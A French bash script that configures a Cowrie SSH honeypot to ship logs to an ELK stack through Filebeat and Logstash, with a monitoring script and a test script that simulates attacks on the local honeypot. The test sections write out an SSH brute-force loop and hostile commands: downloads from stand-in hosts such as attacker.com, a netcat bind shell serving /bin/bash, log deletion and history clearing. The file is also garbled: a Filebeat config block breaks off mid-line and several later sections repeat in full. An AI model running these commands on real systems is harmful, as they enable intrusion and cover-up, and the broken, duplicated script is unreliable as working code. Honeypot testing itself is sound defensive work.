#!/bin/bash

# ==============================================================================
# ÉTAPE 6.1 : CONFIGURATION DE COWRIE VERS ELK
# ==============================================================================
# Ce script configure Cowrie pour envoyer ses logs vers votre stack ELK
# À exécuter sur la VM Honeypot (192.168.2.117)

# Configuration
ELK_SERVER="192.168.2.124"
LOGSTASH_BEATS_PORT="5044"
LOGSTASH_TCP_PORT="5046"
COWRIE_USER="cowrie"
COWRIE_HOME="/home/cowrie"
COWRIE_PATH="$COWRIE_HOME/cowrie"

# Couleurs pour les logs
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

print_status() {
    echo -e "${BLUE}[INFO]${NC} $1"
}

print_success() {
    echo -e "${GREEN}[SUCCESS]${NC} $1"
}

print_warning() {
    echo -e "${YELLOW}[WARNING]${NC} $1"
}

print_error() {
    echo -e "${RED}[ERROR]${NC} $1"
}

# ==============================================================================
# ÉTAPE 1 : VÉRIFICATIONS PRÉLIMINAIRES
# ==============================================================================

print_status "=== ÉTAPE 6.1 : CONFIGURATION COWRIE VERS ELK ==="
echo ""

# Vérifier qu'on est sur la bonne VM
CURRENT_IP=$(ip route get 8.8.8.8 | awk '{print $7}' | head -1)
if [ "$CURRENT_IP" != "192.168.2.117" ]; then
    print_error "Ce script doit être exécuté sur la VM Honeypot (192.168.2.117)"
    print_error "IP actuelle: $CURRENT_IP"
    exit 1
fi

print_success "✓ Exécution sur la VM Honeypot ($CURRENT_IP)"

# Vérifier Cowrie
if ! systemctl is-active cowrie >/dev/null 2>&1; then
    print_error "Cowrie n'est pas actif. Démarrage..."
    systemctl start cowrie
    sleep 3
fi

if systemctl is-active cowrie >/dev/null 2>&1; then
    print_success "✓ Cowrie est actif"
else
    print_error "Impossible de démarrer Cowrie"
    exit 1
fi

# Vérifier la connectivité vers ELK
print_status "Test de connectivité vers ELK Stack..."

if ! ping -c 1 "$ELK_SERVER" >/dev/null 2>&1; then
    print_error "Impossible de joindre le serveur ELK ($ELK_SERVER)"
    exit 1
fi

if ! nc -z "$ELK_SERVER" "$LOGSTASH_BEATS_PORT" 2>/dev/null; then
    print_error "Port Logstash Beats ($LOGSTASH_BEATS_PORT) non accessible"
    exit 1
fi

if ! nc -z "$ELK_SERVER" "$LOGSTASH_TCP_PORT" 2>/dev/null; then
    print_error "Port Logstash TCP ($LOGSTASH_TCP_PORT) non accessible"
    exit 1
fi

print_success "✓ Connectivité ELK Stack validée"

# ==============================================================================
# ÉTAPE 2 : INSTALLATION DE FILEBEAT
# ==============================================================================

print_status "Installation de Filebeat..."

# Vérifier si Filebeat est déjà installé
if command -v filebeat >/dev/null 2>&1; then
    print_success "✓ Filebeat déjà installé"
else
    print_status "Installation de Filebeat..."
    
    # Ajouter la clé GPG et le repository
    wget -qO - https://artifacts.elastic.co/GPG-KEY-elasticsearch | apt-key add -
    echo "deb https://artifacts.elastic.co/packages/8.x/apt stable main" | tee -a /etc/apt/sources.list.d/elastic-8.x.list
    
    # Installer Filebeat
    apt-get update
    apt-get install -y filebeat
    
    # Empêcher le démarrage automatique (on va le configurer d'abord)
    systemctl disable filebeat
    
    print_success "✓ Filebeat installé"
fi

# ==============================================================================
# ÉTAPE 3 : CONFIGURATION DE COWRIE POUR ELK
# ==============================================================================

print_status "Configuration de Cowrie pour ELK..."

# Backup de la configuration existante
if [ -f "$COWRIE_PATH/etc/cowrie.cfg" ]; then
    cp "$COWRIE_PATH/etc/cowrie.cfg" "$COWRIE_PATH/etc/cowrie.cfg.backup.$(date +%Y%m%d_%H%M%S)"
    print_success "✓ Backup de la configuration Cowrie créé"
fi

# Récupérer la configuration actuelle et l'adapter
print_status "Récupération de la configuration Cowrie existante..."

# Analyser la config actuelle pour préserver les personnalisations
CURRENT_CONFIG="$COWRIE_PATH/etc/cowrie.cfg"

# Backup de la configuration actuelle avec logs existants
if [ -f "$CURRENT_CONFIG" ]; then
    cp "$CURRENT_CONFIG" "$COWRIE_PATH/etc/cowrie.cfg.pre_elk_$(date +%Y%m%d_%H%M%S)"
    print_success "✓ Configuration actuelle sauvegardée"
    
    # Afficher la config actuelle pour info
    print_status "Configuration actuelle des outputs:"
    grep -A 10 -B 2 "output" "$CURRENT_CONFIG" 2>/dev/null || echo "Aucun output configuré"
fi

# Configuration Cowrie ADAPTÉE à vos logs existants
cat > "$COWRIE_PATH/etc/cowrie.cfg" << 'EOF'
# ==============================================================================
# CONFIGURATION COWRIE POUR ELK - ADAPTÉE AUX LOGS EXISTANTS
# ==============================================================================

[honeypot]
hostname = srv-prod-web01
log_path = var/log/cowrie
download_path = var/lib/cowrie/downloads
state_path = var/lib/cowrie
etc_path = etc
contents_path = honeyfs
txtcmds_path = txtcmds
ttylog_path = var/lib/cowrie/tty
interactive_timeout = 300
backend = shell

[ssh]
rsa_public_key = etc/ssh_host_rsa_key.pub
rsa_private_key = etc/ssh_host_rsa_key
dsa_public_key = etc/ssh_host_dsa_key.pub
dsa_private_key = etc/ssh_host_dsa_key
ecdsa_public_key = etc/ssh_host_ecdsa_key.pub
ecdsa_private_key = etc/ssh_host_ecdsa_key
ed25519_public_key = etc/ssh_host_ed25519_key.pub
ed25519_private_key = etc/ssh_host_ed25519_key
version = SSH-2.0-OpenSSH_7.4
listen_endpoints = tcp:2222:interface=0.0.0.0
sftp_enabled = true
forwarding = true
forward_redirect = true
forward_tunnel = true

[telnet]
enabled = false

[shell]
processes = ps waux
filesystem = share/cowrie/fs.pickle
arch = linux-x64-lsb

# =============================================================================
# OUTPUTS - CONFIGURATION MULTIPLE POUR ELK (COMPATIBLE LOGS EXISTANTS)
# =============================================================================

# Output principal : JSON vers fichier (NOUVEAU - pour Filebeat)
[output_jsonlog]
logfile = var/log/cowrie/cowrie.json
epoch_timestamp = false

# Output vers fichier traditionnel (CONSERVÉ - comme vos logs actuels)
[output_textlog]
logfile = var/log/cowrie/cowrie.log

# Output vers Logstash TCP (NOUVEAU - envoi direct vers ELK)
[output_logstash]
host = 192.168.2.124
port = 5046
timeout = 5
reconnect_delay = 10
EOF

# Fixer les permissions
chown -R "$COWRIE_USER:$COWRIE_USER" "$COWRIE_PATH/etc/"
print_success "✓ Configuration Cowrie mise à jour"

# ==============================================================================
# ÉTAPE 4 : CONFIGURATION DE FILEBEAT
# ==============================================================================

print_status "Configuration de Filebeat..."

# Backup de la configuration Filebeat
if [ -f /etc/filebeat/filebeat.yml ]; then
    cp /etc/filebeat/filebeat.yml /etc/filebeat/filebeat.yml.backup.$(date +%Y%m%d_%H%M%S)
fi

# Configuration Filebeat ADAPTÉE à vos logs existants
cat > /etc/filebeat/filebeat.yml << EOF
# ==============================================================================
# FILEBEAT CONFIGURATION POUR COWRIE HONEYPOT
# ==============================================================================

filebeat.inputs:
# Input 1: Nouveaux logs JSON (sera créé après restart)
- type: log
  enabled: true
  paths:
    - /home/cowrie/cowrie/var/log/cowrie/cowrie.json
  fields:
    logstash_pipeline: cowrie
    honeypot_type: ssh
    honeypot_service: cowrie
    source_vm: honeypot-117
    log_source: json_new
  fields_under_root: false
  json.keys_under_root: true
  json.add_error_key: true
  json.message_key: message
  multiline.pattern: '^\{'
  multiline.negate: true
  multiline.match: after
  close_inactive: 5m
  scan_frequency: 1s
  harvester_buffer_size: 16384
  max_bytes: 10485760

# Input 2: Anciens logs JSON archivés (pour récupérer l'historique)
- type: log
  enabled: true
  paths:
    - /home/cowrie/cowrie/var/log/cowrie/cowrie.json.*
  exclude_files: ['\.gz

# ==============================================================================
# OUTPUT VERS LOGSTASH
# ==============================================================================

output.logstash:
  hosts: ["192.168.2.124:5044"]
  worker: 2
  compression_level: 3
  ttl: 30s
  pipelining: 2
  loadbalance: true
  timeout: 10s

# ==============================================================================
# CONFIGURATION GÉNÉRALE
# ==============================================================================

name: "honeypot-cowrie-filebeat"
tags: ["cowrie", "honeypot", "ssh", "vm-117"]

processors:
  - add_host_metadata:
      when.not.contains.tags: forwarded
  - add_docker_metadata: ~
  - add_kubernetes_metadata: ~
  - timestamp:
      field: timestamp
      layouts:
        - '2006-01-02T15:04:05.999999Z'
        - '2006-01-02T15:04:05.999Z'
        - '2006-01-02T15:04:05Z'
      test:
        - '2023-10-15T14:30:45.123456Z'

# ==============================================================================
# LOGGING ET MONITORING
# ==============================================================================

logging.level: info
logging.to_files: true
logging.files:
  path: /var/log/filebeat
  name: filebeat
  keepfiles: 7
  permissions: 0644

monitoring.enabled: true

# ==============================================================================
# PERFORMANCE ET SÉCURITÉ
# ==============================================================================

queue.mem:
  events: 4096
  flush.min_events: 512
  flush.timeout: 5s

max_procs: 2
EOF

# Fixer les permissions
chown root:root /etc/filebeat/filebeat.yml
chmod 600 /etc/filebeat/filebeat.yml

print_success "✓ Configuration Filebeat créée"

# ==============================================================================
# ÉTAPE 5 : DÉMARRAGE ET TEST DES SERVICES
# ==============================================================================

print_status "Démarrage des services..."

# Redémarrer Cowrie avec la nouvelle configuration
systemctl restart cowrie
sleep 3

if systemctl is-active cowrie >/dev/null 2>&1; then
    print_success "✓ Cowrie redémarré avec succès"
else
    print_error "Échec du redémarrage de Cowrie"
    systemctl status cowrie
    exit 1
fi

# Démarrer Filebeat
systemctl enable filebeat
systemctl start filebeat
sleep 3

if systemctl is-active filebeat >/dev/null 2>&1; then
    print_success "✓ Filebeat démarré avec succès"
else
    print_error "Échec du démarrage de Filebeat"
    systemctl status filebeat
    exit 1
fi

# ==============================================================================
# ÉTAPE 6 : TESTS ET VALIDATION
# ==============================================================================

print_status "Tests et validation..."

# Vérifier que les fichiers de log sont créés
sleep 5

if [ -f "$COWRIE_PATH/var/log/cowrie/cowrie.json" ]; then
    print_success "✓ Fichier de log JSON créé"
else
    print_warning "⚠ Fichier de log JSON pas encore créé"
fi

# Génération d'événements de test
print_status "Génération d'événements de test..."

# Test 1: Connexion SSH avec échec d'authentification
print_status "Test 1: Tentative de connexion SSH..."
expect << 'EOF' &
spawn ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p 2222 admin@127.0.0.1
expect "password:"
send "admin123\r"
expect "password:"
send "password\r"
expect "password:"
send "root\r"
expect eof
EOF

sleep 2

# Test 2: Connexion SSH avec succès et commandes
print_status "Test 2: Connexion SSH avec commandes..."
expect << 'EOF' &
spawn ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p 2222 root@127.0.0.1
expect "password:"
send "123456\r"
expect "root@srv-prod-web01:~#"
send "whoami\r"
expect "root@srv-prod-web01:~#"
send "ls -la\r"
expect "root@srv-prod-web01:~#"
send "cat /etc/passwd\r"
expect "root@srv-prod-web01:~#"
send "wget http://malware.example.com/shell.sh\r"
expect "root@srv-prod-web01:~#"
send "exit\r"
expect eof
EOF

sleep 5

# Vérifier ET traiter les logs existants
print_status "Vérification et traitement des logs existants..."

# Vérifier les logs JSON archivés  
if [ -f "$COWRIE_PATH/var/log/cowrie/cowrie.json.1" ]; then
    JSON_ARCHIVE_COUNT=$(wc -l < "$COWRIE_PATH/var/log/cowrie/cowrie.json.1")
    print_success "✓ Logs JSON archivés trouvés: $JSON_ARCHIVE_COUNT événements dans cowrie.json.1"
    
    # Afficher un exemple
    print_status "Exemple d'événement archivé:"
    head -1 "$COWRIE_PATH/var/log/cowrie/cowrie.json.1" | jq -r '.eventid + " - " + .message' 2>/dev/null || head -1 "$COWRIE_PATH/var/log/cowrie/cowrie.json.1"
fi

# Vérifier les logs texte actuels
if [ -f "$COWRIE_PATH/var/log/cowrie/cowrie.log" ] && [ -s "$COWRIE_PATH/var/log/cowrie/cowrie.log" ]; then
    TEXT_LOG_COUNT=$(wc -l < "$COWRIE_PATH/var/log/cowrie/cowrie.log")
    print_success "✓ Logs texte actuels trouvés: $TEXT_LOG_COUNT lignes dans cowrie.log"
    
    # Afficher un exemple  
    print_status "Exemple de log texte:"
    tail -1 "$COWRIE_PATH/var/log/cowrie/cowrie.log"
fi

# Créer le nouveau fichier JSON (vide pour commencer proprement)
touch "$COWRIE_PATH/var/log/cowrie/cowrie.json"
chown "$COWRIE_USER:$COWRIE_USER" "$COWRIE_PATH/var/log/cowrie/cowrie.json"
print_success "✓ Nouveau fichier cowrie.json créé et prêt"

# Test de connectivité Filebeat
print_status "Test de connectivité Filebeat..."
if systemctl is-active filebeat >/dev/null 2>&1; then
    FB_LOGS=$(journalctl -u filebeat -n 10 --no-pager | grep -i "connection\|error\|success" | tail -3)
    if [ -n "$FB_LOGS" ]; then
        print_status "Logs Filebeat récents:"
        echo "$FB_LOGS"
    fi
fi

# ==============================================================================
# ÉTAPE 7 : VÉRIFICATION DANS ELASTICSEARCH
# ==============================================================================

print_status "Vérification dans Elasticsearch..."

# Attendre que les données arrivent dans ELK
sleep 10

# Vérifier les données dans Elasticsearch
ES_CHECK=$(curl -s "http://$ELK_SERVER:9200/honeypot-cowrie-*/_search?size=0" | jq -r '.hits.total.value // .hits.total' 2>/dev/null)

if [ "$ES_CHECK" ] && [ "$ES_CHECK" -gt 0 ]; then
    print_success "✓ $ES_CHECK événements Cowrie indexés dans Elasticsearch"
    
    # Afficher quelques exemples
    print_status "Exemples d'événements indexés:"
    curl -s "http://$ELK_SERVER:9200/honeypot-cowrie-*/_search?size=3&sort=@timestamp:desc" | jq -r '.hits.hits[]._source | "\(.["@timestamp"]) - \(.eventid) - \(.src_ip // .client_ip) - \(.message)"' 2>/dev/null
else
    print_warning "⚠ Aucun événement Cowrie trouvé dans Elasticsearch"
    print_status "Vérification des indices disponibles:"
    curl -s "http://$ELK_SERVER:9200/_cat/indices/honeypot-*?v"
fi

# ==============================================================================
# ÉTAPE 8 : CRÉATION D'UN SCRIPT DE MONITORING
# ==============================================================================

print_status "Création du script de monitoring..."

cat > /opt/monitor_cowrie_elk.sh << 'EOF'
#!/bin/bash

# Script de monitoring Cowrie -> ELK
# Vérifie que les données arrivent correctement

ELK_SERVER="192.168.2.124"
COWRIE_LOG="/home/cowrie/cowrie/var/log/cowrie/cowrie.json"

echo "=== MONITORING COWRIE -> ELK ==="
echo "Timestamp: $(date)"
echo ""

# Vérifier les services
echo "SERVICES:"
echo "- Cowrie: $(systemctl is-active cowrie)"
echo "- Filebeat: $(systemctl is-active filebeat)"
echo ""

# Vérifier les logs locaux
if [ -f "$COWRIE_LOG" ]; then
    LOG_COUNT=$(wc -l < "$COWRIE_LOG")
    echo "LOGS LOCAUX:"
    echo "- Événements dans cowrie.json: $LOG_COUNT"
    echo "- Dernier événement: $(tail -1 "$COWRIE_LOG" | jq -r '.timestamp + " - " + .eventid' 2>/dev/null)"
    echo ""
fi

# Vérifier dans Elasticsearch
echo "ELASTICSEARCH:"
ES_COUNT=$(curl -s "http://$ELK_SERVER:9200/honeypot-cowrie-*/_search?size=0" | jq -r '.hits.total.value // .hits.total' 2>/dev/null)
echo "- Événements indexés: $ES_COUNT"

if [ "$ES_COUNT" ] && [ "$ES_COUNT" -gt 0 ]; then
    echo "- Dernier événement ES:"
    curl -s "http://$ELK_SERVER:9200/honeypot-cowrie-*/_search?size=1&sort=@timestamp:desc" | jq -r '.hits.hits[]._source | "  " + .["@timestamp"] + " - " + .eventid + " - " + (.src_ip // .client_ip)' 2>/dev/null
fi

echo ""
echo "=== FIN MONITORING ==="
EOF

chmod +x /opt/monitor_cowrie_elk.sh

# ==============================================================================
# ÉTAPE 9 : CRÉATION D'UN SCRIPT DE TEST
# ==============================================================================

print_status "Création du script de test..."

cat > /opt/test_cowrie_attacks.sh << 'EOF'
#!/bin/bash

# Script de test pour générer des attaques Cowrie
# Simule différents types d'attaques SSH

echo "=== GÉNÉRATION D'ATTAQUES COWRIE ==="
echo "Timestamp: $(date)"
echo ""

# Test 1: Brute force SSH
echo "Test 1: Brute force SSH..."
for user in admin root test administrator; do
    for pass in 123456 password admin root; do
        timeout 10 sshpass -p "$pass" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p 2222 "$user@127.0.0.1" "echo test" 2>/dev/null &
    done
done

sleep 3

# Test 2: Connexion avec commandes malveillantes
echo "Test 2: Connexion avec commandes malveillantes..."
expect << 'EXPECTEOF' &
spawn ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p 2222 root@127.0.0.1
expect "password:"
send "123456\r"
expect "root@srv-prod-web01:~#"
send "curl -O http://malware.example.com/cryptominer\r"
expect "root@srv-prod-web01:~#"
send "wget http://attacker.com/backdoor.sh\r"
expect "root@srv-prod-web01:~#"
send "nc -l -p 4444 -e /bin/bash\r"
expect "root@srv-prod-web01:~#"
send "rm -rf /var/log/*\r"
expect "root@srv-prod-web01:~#"
send "history -c\r"
expect "root@srv-prod-web01:~#"
send "exit\r"
expect eof
EXPECTEOF

sleep 3

# Test 3: Tentatives de téléchargement
echo "Test 3: Tentatives de téléchargement..."
expect << 'EXPECTEOF' &
spawn ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p 2222 ubuntu@127.0.0.1
expect "password:"
send "ubuntu\r"
expect "root@srv-prod-web01:~#"
send "wget http://example.com/malware.exe\r"
expect "root@srv-prod-web01:~#"
send "curl -O http://badsite.com/shell.php\r"
expect "root@srv-prod-web01:~#"
send "exit\r"
expect eof
EXPECTEOF

echo ""
echo "Tests terminés. Vérifiez les logs dans 10 secondes..."
sleep 10

# Afficher les résultats
echo ""
echo "=== RÉSULTATS ==="
if [ -f /home/cowrie/cowrie/var/log/cowrie/cowrie.json ]; then
    echo "Nouveaux événements générés:"
    tail -10 /home/cowrie/cowrie/var/log/cowrie/cowrie.json | jq -r '.eventid + " - " + .message' 2>/dev/null
fi
EOF

chmod +x /opt/test_cowrie_attacks.sh

# ==============================================================================
# RÉSUMÉ ET FINALISATION
# ==============================================================================

print_status "=== ÉTAPE 6.1 TERMINÉE AVEC SUCCÈS ==="
echo ""

print_success "✅ CONFIGURATION TERMINÉE:"
echo "   • Cowrie configuré avec outputs multiples"
echo "   • Filebeat installé et configuré"
echo "   • Services démarrés et opérationnels"
echo "   • Tests d'intégration exécutés"
echo "   • Scripts de monitoring créés"
echo ""

print_success "✅ OUTPUTS COWRIE CONFIGURÉS:"
echo "   • JSON vers fichier (pour Filebeat)"
echo "   • TCP direct vers Logstash"
echo "   • Logs texte (backup)"
echo ""

print_success "✅ FILEBEAT CONFIGURÉ:"
echo "   • Collecte des logs JSON et texte"
echo "   • Envoi vers Logstash (port 5044)"
echo "   • Métadonnées honeypot ajoutées"
echo ""

print_success "✅ SCRIPTS UTILITAIRES CRÉÉS:"
echo "   • /opt/monitor_cowrie_elk.sh"
echo "   • /opt/test_cowrie_attacks.sh"
echo ""

print_warning "📋 PROCHAINES ÉTAPES:"
echo "1. Vérifier les données dans Kibana"
echo "2. Passer à l'étape 6.2 (FTP Honeypot)"
echo "3. Passer à l'étape 6.3 (HTTP Honeypot)"
echo ""

print_success "✅ COWRIE -> ELK INTEGRATION RÉUSSIE!"
echo ""

# Log final
echo "$(date): Étape 6.1 - Configuration Cowrie vers ELK terminée avec succès" >> /var/log/honeypot-setup.log
]
  fields:
    logstash_pipeline: cowrie
    honeypot_type: ssh
    honeypot_service: cowrie
    source_vm: honeypot-117
    log_source: json_archive
  fields_under_root: false
  json.keys_under_root: true
  json.add_error_key: true
  json.message_key: message
  multiline.pattern: '^\{'
  multiline.negate: true
  multiline.match: after
  close_inactive: 15m
  scan_frequency: 5s
  harvester_buffer_size: 16384
  max_bytes: 10485760

# Input 3: Logs texte actuels (format traditionnel)
- type: log
  enabled: true
  paths:
    - /home/cowrie/cowrie/var/log/cowrie/cowrie.log
    - /home/cowrie/cowrie/var/log/cowrie/cowrie.log.*
  exclude_files: ['\.gz

# ==============================================================================
# OUTPUT VERS LOGSTASH
# ==============================================================================

output.logstash:
  hosts: ["192.168.2.124:5044"]
  worker: 2
  compression_level: 3
  ttl: 30s
  pipelining: 2
  loadbalance: true
  timeout: 10s

# ==============================================================================
# CONFIGURATION GÉNÉRALE
# ==============================================================================

name: "honeypot-cowrie-filebeat"
tags: ["cowrie", "honeypot", "ssh", "vm-117"]

processors:
  - add_host_metadata:
      when.not.contains.tags: forwarded
  - add_docker_metadata: ~
  - add_kubernetes_metadata: ~
  - timestamp:
      field: timestamp
      layouts:
        - '2006-01-02T15:04:05.999999Z'
        - '2006-01-02T15:04:05.999Z'
        - '2006-01-02T15:04:05Z'
      test:
        - '2023-10-15T14:30:45.123456Z'

# ==============================================================================
# LOGGING ET MONITORING
# ==============================================================================

logging.level: info
logging.to_files: true
logging.files:
  path: /var/log/filebeat
  name: filebeat
  keepfiles: 7
  permissions: 0644

monitoring.enabled: true

# ==============================================================================
# PERFORMANCE ET SÉCURITÉ
# ==============================================================================

queue.mem:
  events: 4096
  flush.min_events: 512
  flush.timeout: 5s

max_procs: 2
EOF

# Fixer les permissions
chown root:root /etc/filebeat/filebeat.yml
chmod 600 /etc/filebeat/filebeat.yml

print_success "✓ Configuration Filebeat créée"

# ==============================================================================
# ÉTAPE 5 : DÉMARRAGE ET TEST DES SERVICES
# ==============================================================================

print_status "Démarrage des services..."

# Redémarrer Cowrie avec la nouvelle configuration
systemctl restart cowrie
sleep 3

if systemctl is-active cowrie >/dev/null 2>&1; then
    print_success "✓ Cowrie redémarré avec succès"
else
    print_error "Échec du redémarrage de Cowrie"
    systemctl status cowrie
    exit 1
fi

# Démarrer Filebeat
systemctl enable filebeat
systemctl start filebeat
sleep 3

if systemctl is-active filebeat >/dev/null 2>&1; then
    print_success "✓ Filebeat démarré avec succès"
else
    print_error "Échec du démarrage de Filebeat"
    systemctl status filebeat
    exit 1
fi

# ==============================================================================
# ÉTAPE 6 : TESTS ET VALIDATION
# ==============================================================================

print_status "Tests et validation..."

# Vérifier que les fichiers de log sont créés
sleep 5

if [ -f "$COWRIE_PATH/var/log/cowrie/cowrie.json" ]; then
    print_success "✓ Fichier de log JSON créé"
else
    print_warning "⚠ Fichier de log JSON pas encore créé"
fi

# Génération d'événements de test
print_status "Génération d'événements de test..."

# Test 1: Connexion SSH avec échec d'authentification
print_status "Test 1: Tentative de connexion SSH..."
expect << 'EOF' &
spawn ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p 2222 admin@127.0.0.1
expect "password:"
send "admin123\r"
expect "password:"
send "password\r"
expect "password:"
send "root\r"
expect eof
EOF

sleep 2

# Test 2: Connexion SSH avec succès et commandes
print_status "Test 2: Connexion SSH avec commandes..."
expect << 'EOF' &
spawn ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p 2222 root@127.0.0.1
expect "password:"
send "123456\r"
expect "root@srv-prod-web01:~#"
send "whoami\r"
expect "root@srv-prod-web01:~#"
send "ls -la\r"
expect "root@srv-prod-web01:~#"
send "cat /etc/passwd\r"
expect "root@srv-prod-web01:~#"
send "wget http://malware.example.com/shell.sh\r"
expect "root@srv-prod-web01:~#"
send "exit\r"
expect eof
EOF

sleep 5

# Vérifier les logs
print_status "Vérification des logs générés..."

if [ -f "$COWRIE_PATH/var/log/cowrie/cowrie.json" ]; then
    LOG_COUNT=$(wc -l < "$COWRIE_PATH/var/log/cowrie/cowrie.json")
    if [ "$LOG_COUNT" -gt 0 ]; then
        print_success "✓ $LOG_COUNT événements générés dans cowrie.json"
        print_status "Derniers événements:"
        tail -3 "$COWRIE_PATH/var/log/cowrie/cowrie.json" | jq -r '.eventid + " - " + .message' 2>/dev/null || tail -3 "$COWRIE_PATH/var/log/cowrie/cowrie.json"
    else
        print_warning "⚠ Aucun événement dans cowrie.json"
    fi
fi

# Test de connectivité Filebeat
print_status "Test de connectivité Filebeat..."
if systemctl is-active filebeat >/dev/null 2>&1; then
    FB_LOGS=$(journalctl -u filebeat -n 10 --no-pager | grep -i "connection\|error\|success" | tail -3)
    if [ -n "$FB_LOGS" ]; then
        print_status "Logs Filebeat récents:"
        echo "$FB_LOGS"
    fi
fi

# ==============================================================================
# ÉTAPE 7 : VÉRIFICATION DANS ELASTICSEARCH
# ==============================================================================

print_status "Vérification dans Elasticsearch..."

# Attendre que les données arrivent dans ELK
sleep 10

# Vérifier les données dans Elasticsearch
ES_CHECK=$(curl -s "http://$ELK_SERVER:9200/honeypot-cowrie-*/_search?size=0" | jq -r '.hits.total.value // .hits.total' 2>/dev/null)

if [ "$ES_CHECK" ] && [ "$ES_CHECK" -gt 0 ]; then
    print_success "✓ $ES_CHECK événements Cowrie indexés dans Elasticsearch"
    
    # Afficher quelques exemples
    print_status "Exemples d'événements indexés:"
    curl -s "http://$ELK_SERVER:9200/honeypot-cowrie-*/_search?size=3&sort=@timestamp:desc" | jq -r '.hits.hits[]._source | "\(.["@timestamp"]) - \(.eventid) - \(.src_ip // .client_ip) - \(.message)"' 2>/dev/null
else
    print_warning "⚠ Aucun événement Cowrie trouvé dans Elasticsearch"
    print_status "Vérification des indices disponibles:"
    curl -s "http://$ELK_SERVER:9200/_cat/indices/honeypot-*?v"
fi

# ==============================================================================
# ÉTAPE 8 : CRÉATION D'UN SCRIPT DE MONITORING
# ==============================================================================

print_status "Création du script de monitoring..."

cat > /opt/monitor_cowrie_elk.sh << 'EOF'
#!/bin/bash

# Script de monitoring Cowrie -> ELK
# Vérifie que les données arrivent correctement

ELK_SERVER="192.168.2.124"
COWRIE_LOG="/home/cowrie/cowrie/var/log/cowrie/cowrie.json"

echo "=== MONITORING COWRIE -> ELK ==="
echo "Timestamp: $(date)"
echo ""

# Vérifier les services
echo "SERVICES:"
echo "- Cowrie: $(systemctl is-active cowrie)"
echo "- Filebeat: $(systemctl is-active filebeat)"
echo ""

# Vérifier les logs locaux
if [ -f "$COWRIE_LOG" ]; then
    LOG_COUNT=$(wc -l < "$COWRIE_LOG")
    echo "LOGS LOCAUX:"
    echo "- Événements dans cowrie.json: $LOG_COUNT"
    echo "- Dernier événement: $(tail -1 "$COWRIE_LOG" | jq -r '.timestamp + " - " + .eventid' 2>/dev/null)"
    echo ""
fi

# Vérifier dans Elasticsearch
echo "ELASTICSEARCH:"
ES_COUNT=$(curl -s "http://$ELK_SERVER:9200/honeypot-cowrie-*/_search?size=0" | jq -r '.hits.total.value // .hits.total' 2>/dev/null)
echo "- Événements indexés: $ES_COUNT"

if [ "$ES_COUNT" ] && [ "$ES_COUNT" -gt 0 ]; then
    echo "- Dernier événement ES:"
    curl -s "http://$ELK_SERVER:9200/honeypot-cowrie-*/_search?size=1&sort=@timestamp:desc" | jq -r '.hits.hits[]._source | "  " + .["@timestamp"] + " - " + .eventid + " - " + (.src_ip // .client_ip)' 2>/dev/null
fi

echo ""
echo "=== FIN MONITORING ==="
EOF

chmod +x /opt/monitor_cowrie_elk.sh

# ==============================================================================
# ÉTAPE 9 : CRÉATION D'UN SCRIPT DE TEST
# ==============================================================================

print_status "Création du script de test..."

cat > /opt/test_cowrie_attacks.sh << 'EOF'
#!/bin/bash

# Script de test pour générer des attaques Cowrie
# Simule différents types d'attaques SSH

echo "=== GÉNÉRATION D'ATTAQUES COWRIE ==="
echo "Timestamp: $(date)"
echo ""

# Test 1: Brute force SSH
echo "Test 1: Brute force SSH..."
for user in admin root test administrator; do
    for pass in 123456 password admin root; do
        timeout 10 sshpass -p "$pass" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p 2222 "$user@127.0.0.1" "echo test" 2>/dev/null &
    done
done

sleep 3

# Test 2: Connexion avec commandes malveillantes
echo "Test 2: Connexion avec commandes malveillantes..."
expect << 'EXPECTEOF' &
spawn ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p 2222 root@127.0.0.1
expect "password:"
send "123456\r"
expect "root@srv-prod-web01:~#"
send "curl -O http://malware.example.com/cryptominer\r"
expect "root@srv-prod-web01:~#"
send "wget http://attacker.com/backdoor.sh\r"
expect "root@srv-prod-web01:~#"
send "nc -l -p 4444 -e /bin/bash\r"
expect "root@srv-prod-web01:~#"
send "rm -rf /var/log/*\r"
expect "root@srv-prod-web01:~#"
send "history -c\r"
expect "root@srv-prod-web01:~#"
send "exit\r"
expect eof
EXPECTEOF

sleep 3

# Test 3: Tentatives de téléchargement
echo "Test 3: Tentatives de téléchargement..."
expect << 'EXPECTEOF' &
spawn ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p 2222 ubuntu@127.0.0.1
expect "password:"
send "ubuntu\r"
expect "root@srv-prod-web01:~#"
send "wget http://example.com/malware.exe\r"
expect "root@srv-prod-web01:~#"
send "curl -O http://badsite.com/shell.php\r"
expect "root@srv-prod-web01:~#"
send "exit\r"
expect eof
EXPECTEOF

echo ""
echo "Tests terminés. Vérifiez les logs dans 10 secondes..."
sleep 10

# Afficher les résultats
echo ""
echo "=== RÉSULTATS ==="
if [ -f /home/cowrie/cowrie/var/log/cowrie/cowrie.json ]; then
    echo "Nouveaux événements générés:"
    tail -10 /home/cowrie/cowrie/var/log/cowrie/cowrie.json | jq -r '.eventid + " - " + .message' 2>/dev/null
fi
EOF

chmod +x /opt/test_cowrie_attacks.sh

# ==============================================================================
# RÉSUMÉ ET FINALISATION
# ==============================================================================

print_status "=== ÉTAPE 6.1 TERMINÉE AVEC SUCCÈS ==="
echo ""

print_success "✅ CONFIGURATION TERMINÉE:"
echo "   • Cowrie configuré avec outputs multiples"
echo "   • Filebeat installé et configuré"
echo "   • Services démarrés et opérationnels"
echo "   • Tests d'intégration exécutés"
echo "   • Scripts de monitoring créés"
echo ""

print_success "✅ OUTPUTS COWRIE CONFIGURÉS:"
echo "   • JSON vers fichier (pour Filebeat)"
echo "   • TCP direct vers Logstash"
echo "   • Logs texte (backup)"
echo ""

print_success "✅ FILEBEAT CONFIGURÉ:"
echo "   • Collecte des logs JSON et texte"
echo "   • Envoi vers Logstash (port 5044)"
echo "   • Métadonnées honeypot ajoutées"
echo ""

